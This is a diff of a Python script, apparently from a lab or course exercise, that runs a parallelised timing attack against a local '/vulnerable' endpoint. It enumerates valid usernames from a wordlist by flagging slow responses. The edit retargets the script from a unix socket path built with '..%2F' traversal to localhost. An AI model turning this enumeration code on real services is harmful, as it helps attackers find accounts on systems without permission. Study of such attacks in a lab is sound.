@@ -3,16 +3,17 @@ import concurrent.futures
 import itertools
 import random
 import time
+import sys
 from string import digits, ascii_lowercase
 
 import requests
-import requests_unixsocket
 from tqdm import tqdm
 
-requests_unixsocket.monkeypatch()
+path = "/vulnerable" if len(sys.argv) < 2 else sys.argv[1]
 
-URL_BASE = "http+unix://venv%2F..%2F..%2Ftp2.sock/vulnerable"
-# URL_BASE = "https://webhook.site/92a94f7c-07c1-428b-831c-4b272bdb25c1"
+USERNAME_FILE = "usernames.txt"
+# USERNAME_FILE = "test.txt"
+URL_BASE = "http://localhost:8000" + path
 CHARACTERS = ascii_lowercase + digits
 THRESHOLD = 8.0
 
@@ -50,10 +51,11 @@ def attack():
     print(f"Threshold: {threshold}")
 
     with concurrent.futures.ProcessPoolExecutor(max_workers=24, initializer=initialize_thread) as executor:
-        with tqdm(open("usernames.txt"), total=sum(1 for _ in open('usernames.txt'))) as tusernames:
+        with tqdm(open(USERNAME_FILE), total=sum(1 for _ in open(USERNAME_FILE))) as tusernames:
             usernames = map(lambda x: x[:-1], tusernames)
             for chunk in split_every(720, usernames):
                 for username, time_taken in executor.map(send_attack, chunk):
+                    # print(username, time_taken)
                     if time_taken > threshold:
                         lowest = min(
                             send_attack(username)[1],
